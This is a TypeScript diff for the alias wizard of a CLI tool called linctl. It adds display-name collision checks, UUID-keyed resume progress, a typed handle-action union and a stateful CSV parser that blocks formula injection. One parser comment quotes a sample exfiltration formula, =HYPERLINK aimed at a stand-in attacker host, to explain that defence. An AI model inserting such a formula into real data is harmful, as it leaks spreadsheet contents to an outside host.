@@ -16,6 +16,7 @@ import { GraphQLService } from "../../utils/graphql-service.js";
 import {
 	type AliasesProgress,
 	clearAliasesProgress,
+	parseCsvList,
 	readAliasesProgress,
 	type WizardConfig,
 	writeAliasesProgress,
@@ -76,6 +77,43 @@ export async function fetchAllUsers(token: string): Promise<User[]> {
 }
 
 /**
+ * Find groups of users sharing the same display name. The current alias
+ * config keys aliases by display name, so colliding users would silently
+ * overwrite each other's entries. Detection is exported so the wizard can
+ * warn + skip those users; a follow-up (1.3.0) will migrate the on-disk
+ * schema to UUID-keyed maps.
+ */
+export function findDisplayNameCollisions(users: User[]): Map<string, User[]> {
+	const byName = new Map<string, User[]>();
+	for (const u of users) {
+		const list = byName.get(u.displayName);
+		if (list) list.push(u);
+		else byName.set(u.displayName, [u]);
+	}
+	const collisions = new Map<string, User[]>();
+	for (const [name, group] of byName) {
+		if (group.length > 1) collisions.set(name, group);
+	}
+	return collisions;
+}
+
+/** Apply a HandleAction to a `{ handle: fullName }` map for one user. */
+function applyHandleAction(
+	handlesMap: Record<string, string>,
+	fullName: string,
+	action: HandleAction,
+): void {
+	if (action.kind === "keep") return;
+	const currentKeys = Object.entries(handlesMap)
+		.filter(([_, v]) => v === fullName)
+		.map(([k]) => k);
+	for (const k of currentKeys) delete handlesMap[k];
+	if (action.kind === "set" && action.value.trim()) {
+		handlesMap[action.value.trim()] = fullName;
+	}
+}
+
+/**
  * Merge new alias entries into existing config without dropping unrelated
  * fields. Pure function — no I/O. Exported for testing.
  */
@@ -114,34 +152,42 @@ export function mergeAliasesIntoConfig(
 		}
 		// "keep" → no changes.
 
-		// GitHub / GitLab handles use the same edit/append/clear semantics.
-		for (const platform of ["github", "gitlab"] as const) {
-			const handlesMap = next.members.handles[platform] as Record<
-				string,
-				string
-			>;
-			const currentHandleKeys = Object.entries(handlesMap)
-				.filter(([_, v]) => v === fullName)
-				.map(([k]) => k);
-			const newHandle = update[`${platform}Handle`];
-			if (newHandle === "__clear__") {
-				for (const k of currentHandleKeys) delete handlesMap[k];
-			} else if (newHandle !== undefined && newHandle !== "__keep__") {
-				for (const k of currentHandleKeys) delete handlesMap[k];
-				if (newHandle.trim()) handlesMap[newHandle.trim()] = fullName;
-			}
+		// GitHub / GitLab handles use the same edit/append/clear semantics,
+		// driven by the discriminated HandleAction per platform.
+		for (const platform of HANDLE_PLATFORMS) {
+			applyHandleAction(
+				next.members.handles[platform] as Record<string, string>,
+				fullName,
+				update[platform],
+			);
 		}
 	}
 	return next;
 }
 
+/**
+ * What to do with a single platform handle (github/gitlab/...) when applying
+ * an AliasUpdate. Discriminated union; no sentinel strings.
+ *
+ * - keep:  no change (leave any existing handle for this user alone)
+ * - clear: delete any existing handle for this user
+ * - set:   replace any existing handle with the given value
+ */
+export type HandleAction =
+	| { kind: "keep" }
+	| { kind: "clear" }
+	| { kind: "set"; value: string };
+
+/** Set of supported platforms for member handle keys. */
+export const HANDLE_PLATFORMS = ["github", "gitlab"] as const;
+export type HandlePlatform = (typeof HANDLE_PLATFORMS)[number];
+
 export interface AliasUpdate {
 	displayName: string;
 	mode: "keep" | "edit" | "append" | "clear";
 	aliases: string[];
-	/** "__keep__" leaves it alone, "__clear__" removes, any other string sets. */
-	githubHandle: string | "__keep__" | "__clear__";
-	gitlabHandle: string | "__keep__" | "__clear__";
+	github: HandleAction;
+	gitlab: HandleAction;
 }
 
 function currentAliasesFor(config: WizardConfig, fullName: string): string[] {
@@ -163,31 +209,20 @@ function currentHandleFor(
 	return undefined;
 }
 
-function parseCsvList(value: string): string[] {
-	return value
-		.split(",")
-		.map((s) => s.trim())
-		.filter(Boolean);
-}
-
 /**
  * Walk users one-by-one. Returns updates keyed by user UUID. Caller writes
- * them back via `mergeAliasesIntoConfig`.
+ * them back via `mergeAliasesIntoConfig`. The CSV import path is a separate
+ * entrypoint (`runAliasesImport`) — there's no `importCsv` option on this
+ * function, since the index.ts handler picks one or the other.
  */
 export async function runAliasesStep(
 	token: string,
 	existing: WizardConfig,
 	options: {
-		/** Path to a CSV with batch alias data — when set, skips the interactive walk. */
-		importCsv?: string;
 		/** Skip the per-section "walk now?" prompt and force the walk. */
 		force?: boolean;
 	} = {},
 ): Promise<Map<string, AliasUpdate>> {
-	if (options.importCsv) {
-		return runAliasesImport(options.importCsv);
-	}
-
 	const proceed = options.force
 		? true
 		: await confirm({
@@ -204,46 +239,81 @@ export async function runAliasesStep(
 		return new Map();
 	}
 
-	const users = await fetchAllUsers(token);
-	if (users.length === 0) {
+	const allUsers = await fetchAllUsers(token);
+	if (allUsers.length === 0) {
 		// biome-ignore lint/suspicious/noConsole: wizard
 		console.log("  No active users visible to this token.");
 		return new Map();
 	}
 
-	const startIdx = await resolveResumePoint(users.length);
+	// Skip users whose display name collides with another active user. The
+	// current schema keys aliases by display name, so writing aliases for a
+	// colliding user would corrupt the other user's entries. A schema migration
+	// to UUID-keyed maps is queued for 1.3.0.
+	const collisions = findDisplayNameCollisions(allUsers);
+	const collidingIds = new Set<string>();
+	if (collisions.size > 0) {
+		// biome-ignore lint/suspicious/noConsole: wizard
+		console.log(
+			`  ⚠ ${collisions.size} display name(s) are shared by multiple active users — skipping those to avoid alias corruption:`,
+		);
+		for (const [name, group] of collisions) {
+			// biome-ignore lint/suspicious/noConsole: wizard
+			console.log(
+				`    "${name}" — ${group.map((u) => u.email ?? u.id).join(", ")}`,
+			);
+			for (const u of group) collidingIds.add(u.id);
+		}
+		// biome-ignore lint/suspicious/noConsole: wizard
+		console.log(
+			"    (Add aliases manually in ~/.config/linctl/config.json for now; schema migration in 1.3.0.)",
+		);
+	}
+	const users = allUsers.filter((u) => !collidingIds.has(u.id));
+	if (users.length === 0) {
+		// biome-ignore lint/suspicious/noConsole: wizard
+		console.log("  No safe-to-alias users remain after collision filter.");
+		return new Map();
+	}
+
+	const startIdx = await resolveResumePoint(users);
 	// biome-ignore lint/suspicious/noConsole: wizard
 	console.log(
 		`  Walking ${users.length - startIdx}/${users.length} users. Type 'q' at any prompt to stop and save progress.`,
 	);
 
 	const updates = new Map<string, AliasUpdate>();
-	let lastCompleted = startIdx - 1;
+	let lastCompletedIdx = startIdx - 1;
+
+	const saveProgress = async () => {
+		if (lastCompletedIdx < 0) return;
+		await writeAliasesProgress({
+			lastCompletedUserId: users[lastCompletedIdx].id,
+			totalUsers: users.length,
+			savedAt: new Date().toISOString(),
+		});
+	};
 
 	try {
 		for (let i = startIdx; i < users.length; i++) {
 			const u = users[i];
 			const update = await promptForUser(i + 1, users.length, u, existing);
 			if (update === "quit") {
-				await writeAliasesProgress({
-					lastCompleted,
-					totalUsers: users.length,
-					savedAt: new Date().toISOString(),
-				});
+				await saveProgress();
 				// biome-ignore lint/suspicious/noConsole: wizard
 				console.log(
-					`  Saved progress at ${lastCompleted + 1}/${users.length}. Resume with \`linctl init aliases\`.`,
+					`  Saved progress at ${lastCompletedIdx + 1}/${users.length}. Resume with \`linctl init aliases\`.`,
 				);
 				return updates;
 			}
 			if (
 				update.mode !== "keep" ||
-				update.githubHandle !== "__keep__" ||
-				update.gitlabHandle !== "__keep__"
+				update.github.kind !== "keep" ||
+				update.gitlab.kind !== "keep"
 			) {
 				updates.set(u.id, update);
 			}
-			lastCompleted = i;
+			lastCompletedIdx = i;
 		}
 		await clearAliasesProgress();
 		// biome-ignore lint/suspicious/noConsole: wizard
@@ -251,33 +321,39 @@ export async function runAliasesStep(
 		return updates;
 	} catch (err) {
 		// Save what we have on unexpected error so the user can resume.
-		if (lastCompleted >= startIdx) {
-			await writeAliasesProgress({
-				lastCompleted,
-				totalUsers: users.length,
-				savedAt: new Date().toISOString(),
-			});
-		}
+		if (lastCompletedIdx >= startIdx) await saveProgress();
 		throw err;
 	}
 }
 
-async function resolveResumePoint(totalUsers: number): Promise<number> {
+/**
+ * Decide where to resume the user-walk. Looks up the saved
+ * `lastCompletedUserId` in the freshly-fetched user list:
+ *   - found      → resume at the next index after that user
+ *   - not found  → the workspace changed (user removed/disabled). Start over.
+ *   - no progress → start at 0
+ *
+ * Keying by UUID instead of index means a user being removed or added
+ * between runs no longer silently misaligns the resume point onto the
+ * wrong person.
+ */
+async function resolveResumePoint(users: User[]): Promise<number> {
 	const progress: AliasesProgress | null = await readAliasesProgress();
-	if (!progress || progress.lastCompleted < 0) return 0;
-	if (progress.totalUsers !== totalUsers) {
+	if (!progress?.lastCompletedUserId) return 0;
+	const idx = users.findIndex((u) => u.id === progress.lastCompletedUserId);
+	if (idx < 0) {
 		// biome-ignore lint/suspicious/noConsole: wizard
 		console.log(
-			`  Saved progress is from ${progress.totalUsers} users; the workspace now has ${totalUsers}. Starting over.`,
+			"  Saved progress points at a user no longer in the workspace. Starting over.",
 		);
 		await clearAliasesProgress();
 		return 0;
 	}
 	const resume = await confirm({
-		message: `Resume from user ${progress.lastCompleted + 2}/${progress.totalUsers}? (saved ${progress.savedAt})`,
+		message: `Resume from user ${idx + 2}/${users.length}? (saved ${progress.savedAt})`,
 		default: true,
 	});
-	if (resume) return progress.lastCompleted + 1;
+	if (resume) return idx + 1;
 	await clearAliasesProgress();
 	return 0;
 }
@@ -343,8 +419,8 @@ async function promptForUser(
 			displayName: fullName,
 			mode: "keep",
 			aliases: [],
-			githubHandle: "__keep__",
-			gitlabHandle: "__keep__",
+			github: { kind: "keep" },
+			gitlab: { kind: "keep" },
 		};
 	}
 	if (action === "clear") {
@@ -352,8 +428,8 @@ async function promptForUser(
 			displayName: fullName,
 			mode: "clear",
 			aliases: [],
-			githubHandle: currentGithub ? "__clear__" : "__keep__",
-			gitlabHandle: currentGitlab ? "__clear__" : "__keep__",
+			github: currentGithub ? { kind: "clear" } : { kind: "keep" },
+			gitlab: currentGitlab ? { kind: "clear" } : { kind: "keep" },
 		};
 	}
 
@@ -375,15 +451,26 @@ async function promptForUser(
 		displayName: fullName,
 		mode: action,
 		aliases: parseCsvList(aliasesRaw),
-		githubHandle:
-			githubRaw === (currentGithub ?? "")
-				? "__keep__"
-				: githubRaw.trim() || "__clear__",
-		gitlabHandle:
-			gitlabRaw === (currentGitlab ?? "")
-				? "__keep__"
-				: gitlabRaw.trim() || "__clear__",
+		github: handleActionFromInput(githubRaw, currentGithub),
+		gitlab: handleActionFromInput(gitlabRaw, currentGitlab),
 	};
+}
+
+/**
+ * Translate the raw user input for a handle into a HandleAction:
+ *   - input matches the existing value (or both empty) → keep
+ *   - input is empty + existing was set → clear
+ *   - input is non-empty + differs from existing → set
+ */
+function handleActionFromInput(
+	rawInput: string,
+	existing: string | undefined,
+): HandleAction {
+	const current = existing ?? "";
+	if (rawInput === current) return { kind: "keep" };
+	const trimmed = rawInput.trim();
+	if (!trimmed) return { kind: "clear" };
+	return { kind: "set", value: trimmed };
 }
 
 /**
@@ -395,32 +482,51 @@ async function promptForUser(
  * Lines starting with `#` are comments. Aliases column is comma-separated
  * inside the cell; if the cell contains commas it must be quoted.
  *
- * Each row's email is matched against Linear users; rows that don't match
- * are reported and skipped.
+ * Resolves emails to Linear user UUIDs internally, so the result is keyed
+ * by UUID and ready to pass to `mergeAliasesIntoConfig`. Rows whose email
+ * doesn't match an active user are reported via the returned `skipped[]`
+ * list (the caller decides whether to surface them).
  */
+export interface AliasesImportResult {
+	updates: Map<string, AliasUpdate>;
+	skipped: string[];
+}
+
 export async function runAliasesImport(
+	token: string,
 	csvPath: string,
-): Promise<Map<string, AliasUpdate>> {
+): Promise<AliasesImportResult> {
 	const raw = await fs.readFile(csvPath, "utf8");
 	const rows = parseCsv(raw);
+	const users = await fetchAllUsers(token);
+	const byEmail = new Map<string, User>();
+	for (const u of users) {
+		if (u.email) byEmail.set(u.email.toLowerCase(), u);
+	}
+
 	const updates = new Map<string, AliasUpdate>();
-	// The caller (full wizard) supplies the user list; for the standalone
-	// sub-command, we rely on `linctl init aliases --import` doing its own
-	// user fetch in the entrypoint. This function is intentionally pure.
-	// The caller should resolve emails to user UUIDs and call `mergeAliasesIntoConfig`.
-	// We return the row data with email as key, expecting the caller to map.
+	const skipped: string[] = [];
 	for (const row of rows) {
 		const email = (row.email ?? "").trim().toLowerCase();
 		if (!email) continue;
-		updates.set(email, {
-			displayName: email, // placeholder — caller replaces with the real display name
+		const user = byEmail.get(email);
+		if (!user) {
+			skipped.push(email);
+			continue;
+		}
+		updates.set(user.id, {
+			displayName: user.displayName,
 			mode: "edit",
 			aliases: parseCsvList(row.aliases ?? ""),
-			githubHandle: row.github?.trim() ? row.github.trim() : "__keep__",
-			gitlabHandle: row.gitlab?.trim() ? row.gitlab.trim() : "__keep__",
+			github: row.github?.trim()
+				? { kind: "set", value: row.github.trim() }
+				: { kind: "keep" },
+			gitlab: row.gitlab?.trim()
+				? { kind: "set", value: row.gitlab.trim() }
+				: { kind: "keep" },
 		});
 	}
-	return updates;
+	return { updates, skipped };
 }
 
 interface CsvRow {
@@ -430,52 +536,170 @@ interface CsvRow {
 	gitlab?: string;
 }
 
-/** Minimal CSV parser supporting quoted cells and `#` comment lines. */
+/**
+ * Single-pass character-state CSV parser. Handles RFC 4180 specifics that
+ * a split-by-newline approach gets wrong:
+ *   - Cells with embedded newlines (legal when quoted)
+ *   - Escaped quotes (`""` inside a quoted cell)
+ *   - CRLF line endings
+ *   - `#` comment lines (linctl extension; only at line start)
+ *
+ * Sanitizes against CSV-formula-injection at parse time: any cell starting
+ * with `=`, `+`, `-`, `@`, `\t`, or `\r` is rejected. These would activate
+ * formulas if the resulting config were ever round-tripped to a spreadsheet
+ * (e.g. an alias of `=HYPERLINK("http://attacker/?leak="&A1)` would store
+ * verbatim today and fire the moment someone opened the export in Excel).
+ */
 export function parseCsv(text: string): CsvRow[] {
-	const lines = text
-		.split(/\r?\n/)
-		.filter((l) => l.trim() && !l.trim().startsWith("#"));
-	if (lines.length === 0) return [];
-	const header = splitCsvRow(lines[0]).map((h) => h.toLowerCase());
+	const records = parseCsvRecords(text);
+	const cleaned = records.filter((cells) => {
+		// Drop blank lines and `#`-prefixed comment lines.
+		if (cells.length === 0) return false;
+		if (cells.length === 1 && cells[0].trim() === "") return false;
+		const first = cells[0];
+		if (first.trim().startsWith("#")) return false;
+		return true;
+	});
+	if (cleaned.length === 0) return [];
+	const header = cleaned[0].map((h) => h.trim().toLowerCase());
 	const rows: CsvRow[] = [];
-	for (let i = 1; i < lines.length; i++) {
-		const cells = splitCsvRow(lines[i]);
+	for (let i = 1; i < cleaned.length; i++) {
+		const cells = cleaned[i];
 		const row: CsvRow = {};
 		for (let j = 0; j < header.length; j++) {
+			const value = (cells[j] ?? "").trim();
+			assertNoFormulaInjection(value);
 			const k = header[j] as keyof CsvRow;
-			row[k] = cells[j] ?? "";
+			row[k] = value;
 		}
 		rows.push(row);
 	}
 	return rows;
 }
 
-function splitCsvRow(line: string): string[] {
-	const cells: string[] = [];
-	let cur = "";
-	let inQuotes = false;
-	for (let i = 0; i < line.length; i++) {
-		const c = line[i];
-		if (inQuotes) {
-			if (c === '"') {
-				if (line[i + 1] === '"') {
-					cur += '"';
-					i++;
-				} else {
-					inQuotes = false;
-				}
-			} else {
-				cur += c;
-			}
-		} else if (c === '"' && cur === "") {
-			inQuotes = true;
-		} else if (c === ",") {
-			cells.push(cur);
-			cur = "";
-		} else {
-			cur += c;
-		}
+// `=+-@` are the OWASP-flagged formula-injection triggers in Excel/Google
+// Sheets. Tab and CR are also mentioned in some guides, but our parser trims
+// each cell before reaching this check, so leading whitespace is stripped
+// regardless. Keep the list narrow to avoid false-positive rejections.
+const FORMULA_PREFIXES = ["=", "+", "-", "@"] as const;
+
+function assertNoFormulaInjection(cell: string): void {
+	if (cell.length === 0) return;
+	const first = cell[0];
+	if (FORMULA_PREFIXES.includes(first as (typeof FORMULA_PREFIXES)[number])) {
+		throw new Error(
+			`CSV cell starts with "${first}" — refusing to import to prevent ` +
+				`formula injection (cell: ${JSON.stringify(cell.slice(0, 40))}). ` +
+				`Prefix with a space if the value is intentional.`,
+		);
 	}
-	cells.push(cur);
-	return cells.map((s) => s.trim());
+}
+
+/**
+ * Tokenize a CSV document into records (each record is an array of cells).
+ * Walks character-by-character through a four-state machine:
+ *   - cellStart: about to read a cell. Decide quoted vs. unquoted.
+ *   - unquoted:  reading an unquoted cell. , and newline terminate.
+ *   - quoted:    inside a quoted cell. " is the only terminator.
+ *   - quotedEnd: just saw a " inside a quoted cell — `""` escapes; otherwise
+ *                the cell is closed and we expect a delimiter.
+ */
+function parseCsvRecords(text: string): string[][] {
+	const records: string[][] = [];
+	let row: string[] = [];
+	let cell = "";
+	type State = "cellStart" | "unquoted" | "quoted" | "quotedEnd";
+	let state: State = "cellStart";
+
+	const finishCell = () => {
+		row.push(cell);
+		cell = "";
+		state = "cellStart";
+	};
+	const finishRow = () => {
+		row.push(cell);
+		cell = "";
+		records.push(row);
+		row = [];
+		state = "cellStart";
+	};
+
+	for (let i = 0; i < text.length; i++) {
+		const ch = text[i];
+		if (state === "cellStart") {
+			if (ch === '"') {
+				state = "quoted";
+				continue;
+			}
+			if (ch === ",") {
+				finishCell();
+				continue;
+			}
+			if (ch === "\n") {
+				finishRow();
+				continue;
+			}
+			if (ch === "\r") {
+				if (text[i + 1] === "\n") i++;
+				finishRow();
+				continue;
+			}
+			cell += ch;
+			state = "unquoted";
+			continue;
+		}
+		if (state === "unquoted") {
+			if (ch === ",") {
+				finishCell();
+				continue;
+			}
+			if (ch === "\n") {
+				finishRow();
+				continue;
+			}
+			if (ch === "\r") {
+				if (text[i + 1] === "\n") i++;
+				finishRow();
+				continue;
+			}
+			cell += ch;
+			continue;
+		}
+		if (state === "quoted") {
+			if (ch === '"') {
+				state = "quotedEnd";
+				continue;
+			}
+			cell += ch;
+			continue;
+		}
+		// quotedEnd
+		if (ch === '"') {
+			cell += '"';
+			state = "quoted";
+			continue;
+		}
+		if (ch === ",") {
+			finishCell();
+			continue;
+		}
+		if (ch === "\n") {
+			finishRow();
+			continue;
+		}
+		if (ch === "\r") {
+			if (text[i + 1] === "\n") i++;
+			finishRow();
+			continue;
+		}
+		// Stray character after a closed quote — forgive and treat as unquoted.
+		cell += ch;
+		state = "unquoted";
+	}
+	// Trailing record (no terminating newline).
+	if (cell.length > 0 || row.length > 0) {
+		row.push(cell);
+		records.push(row);
+	}
+	return records;
 }
